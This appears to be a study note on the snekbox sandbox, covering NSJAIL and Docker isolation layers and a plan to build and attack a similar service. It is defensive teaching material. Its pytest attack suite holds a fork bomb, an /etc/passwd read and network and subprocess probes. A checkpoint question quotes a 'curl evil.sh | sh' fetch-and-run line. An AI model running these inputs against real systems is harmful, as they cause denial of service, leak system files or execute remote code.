---
course_code: "CASESTUDY"
course_name: "Open-Source Case Studies"
unit: "Case Study 10 — python-discord/snekbox [Deep R&D + Build Edition]"
tags: [security, sandboxing, python, docker, nsjail, case-study, build-plan]
last_updated: "2026-08-24"
confidence: "high"
source: "https://github.com/python-discord/snekbox (fetched 2026-08-24)"
---

## For future agent
Deep-dive on snekbox with exact mechanism inventory (NSJAIL flags, Docker wrapper, aiohttp service shape) and WHY each isolation layer exists, plus a fully buildable version — **mini-snek: a FastAPI + Docker sandboxed code-eval service with your own attack suite**. Directly reusable for any AI-agent code-execution feature you build later. Feeds [[systems-design-distributed]] security sections.

# Snekbox — Deep R&D

## Part 1 — The Code Inventory

| Component | Tech | Mechanism |
|-----------|------|-----------|
| HTTP service | Python **aiohttp** | `POST /eval {code}` → job → JSON result (stdout/stderr/status); async job handling |
| **NSJAIL** invocation | C binary by Google | The actual jail: clones process into **mount namespace** (isolated fs view), **PID namespace** (can't see host procs), applies **seccomp filter** (syscall allowlist), sets **rlimits** (CPU/proc/memory), `--disable_proc`, chroot-ish rootfs |
| Container layer | Dockerfile around NSJAIL | Extra boundary: container itself isolated from host |
| Timeouts | asyncio + jail time limits | Infinite loops die twice over |
| Config | Nsjail config proto + env | Tunable limits per deployment |

The defense stack in order: **Docker → NSJAIL namespaces → seccomp → rlimits → timeout → no-network → non-root → read-only mounts.** Eight walls; each exists because attackers defeated fewer-walled predecessors.

## Part 2 — Why That Design

| Choice | Why |
|--------|-----|
| NSJAIL not hand-rolled subprocess | Hand-rolled isolation always has holes (fork bombs escape rlimits-less runners; /proc leaks host info; network enables exfil). Battle-tested tool encodes years of escapes |
| seccomp allowlist | Default-deny syscalls kills exotic kernel-attack surfaces wholesale |
| No network | Kills data exfiltration AND most exploit delivery in one flag |
| Separate service (not in-bot) | Bot restarts ≠ killing running evals; scaling independent; blast radius contained |
| stdout/stderr capture only | No structured side-channels back to callers |

## Part 3 — Can I Build My Own Version? ✅ YES — mini-snek (flagship security build)

```
Spec (FastAPI + Docker on your Windows machine via WSL2/Docker Desktop):

M1: POST /eval {language:"python", code:"print(1+1)"} ->
    runs code inside container:
      docker run --rm --network=none --memory=256m --cpus=0.5
        --pids-limit=64 --read-only -v /tmp/out:/out python:3.12-slim
        timeout 10 python -c <code>
    return captured output.

M2: Attack suite as pytest cases against YOUR OWN endpoint:
    fork bomb (def f(): os.fork();f()) -> expect killed, host alive
    open('/etc/passwd').read() -> expect FileNotFoundError/empty view
    socket/network probe -> expect failure (no network)
    infinite loop -> 10s timeout enforced
    write attempt to / -> read-only violation

M3: Hardening pass: drop capabilities (--cap-drop=ALL), add user=nonroot,
    seccomp profile (docker --security-opt seccomp=strict-ish)

M4: Wire into a Discord bot OR an AI-agent tool-calling endpoint
    (= the exact production use-case for 2026 agents).
```

### Failure modes while building

| Failure | Counter |
|---------|---------|
| Output capture races (process killed mid-write) | Read streams with timeouts; tolerate truncation |
| Windows Docker quirks (WSL2 memory) | Cap WSL VM RAM; test limits empirically |
| False confidence after M1 | M2 attack suite is the actual lesson — passing YOUR attacks is the grade |

**Premortem**: *"Built it; never attacked it; assumed safe."* The unwargamed sandbox is theater. M2 is non-negotiable.

## Part 3.5 — R&D Extension: Layer-by-Layer + Attack Suite Code

### NSJAIL flag-by-flag (the eight walls mapped)
| Flag | Wall | Kills |
|------|------|-------|
| `--mode=ONCE` (per-exec) | fresh jail per request | cross-request contamination |
| `--disable_proc` | no /proc | host process/info leaks |
| `--chroot` minimal rootfs | mount namespace | filesystem escape/read |
| `--rlimit_as/mem` | memory cap | memory-bomb DoS |
| `--rlimit_nproc` | proc cap | fork bombs |
| seccomp policy | syscall allowlist | exotic kernel attack surface |
| `--time_limit` | wall clock | infinite loops |
| Docker `--network=none --cap-drop=ALL --read-only` | outer boundary | exfil, privilege, persistence |

### Attack suite (M2 pytest cases — write BEFORE trusting v0.1)
```python
ATTACKS = {
 "fork_bomb": "import os\nwhile True: os.fork()",
 "passwd_read": "print(open('/etc/passwd').read())",
 "net_probe": "import socket;socket.create_connection(('example.com',80))",
 "infinite": "while True: pass",
 "fs_write": "open('/tmp/x','w')",
 "subprocess_escape": "import subprocess;subprocess.run(['whoami'])",
}
@pytest.mark.parametrize("name,code", ATTACKS.items())
def test_attack(name, code, eval_endpoint):
    r = eval_endpoint(code)
    assert r["status"] in ("timeout", "error", "killed")
    assert "root:" not in r.get("stdout", "")      # passwd must be empty/blocked
```
Graduation test: run suite against a NAIVE `subprocess.run(code, timeout=10)` endpoint and document EVERY escape that works — then re-run against mini-snek. The diff is your education.


## Part 4 — Life Integration

- Reuse pattern for: AI-agent code tools, online-judge features, plugin systems
- Metrics: attack-suite cases passing · layers named from memory · one real hostile input survived
- Interview story tier: top-tier fresher security narrative ("I built and then attacked my own sandbox")

## Part 6 — Internals Push: NSJAIL Anatomy & Seccomp Mechanics

### Annotated NSJAIL config
```
mode: ONCE                  # one exec per jail; no reuse contamination
chroot_dir: "/snek"         # attacker sees minimal fake root
mount bind /snek/usr -> /usr  # only what CPython needs
mount tmp read-only         # scratch without persistence
time_limit: 10              # wall-clock kill
rlimit_as: SOFT cap         # address-space memory bomb cap
rlimit_nproc: 64            # fork-bomb cap
clone_newnet: true          # network namespace: zero interfaces
clone_newuser: true         # drop root, map to nobody
clone_newpid: true          # cannot see/kill host processes
seccomp_policy: strict      # syscall allowlist
cgroup pids limit: 64       # cgroup backup to rlimit
```

### seccomp allowlist vs blocklist
Blocklists fail because kernels ADD syscalls faster than lists update — new attack surface enabled by default. Allowlist permits ONLY named calls (read/write/exit/brk/mmap...) and returns EPERM or kills on everything else — ptrace, mount, bpf, keyctl simply do not exist inside. snekbox ships a policy tuned to CPython's real syscall profile: run once in logging mode, collect actual calls, allow exactly that set.

### Extended escape taxonomy beyond M2
- resource: bytearray-loop memory hog (rlimit_as catches); thread bombs (nproc)
- fs tricks: symlink races against bind mounts (read-only + chroot contain)
- interpreter escapes: ctypes CDLL loads (seccomp blocks mmap/open policy paths); os.* abuse (PID+mount namespaces contain blast radius)
- honest limitation: timing side-channels are out of scope for snek-class sandboxing — document it

## Checkpoint Questions

1. Which single layer stops a fork bomb — and which stops `/etc/passwd` reading? (They're different.)
2. Why is default-DENY seccomp stronger than default-allow-with-blocklist?
3. Your agent's LLM generates `os.system("curl evil.sh | sh")` — walk exactly which walls it dies at.

## Cross-Vault Links

[[programming/case-studies/index|Field Index]] · [[systems-design-distributed]] · [[builds/retrieval-agent/overview]] · [[languages-python-advanced]]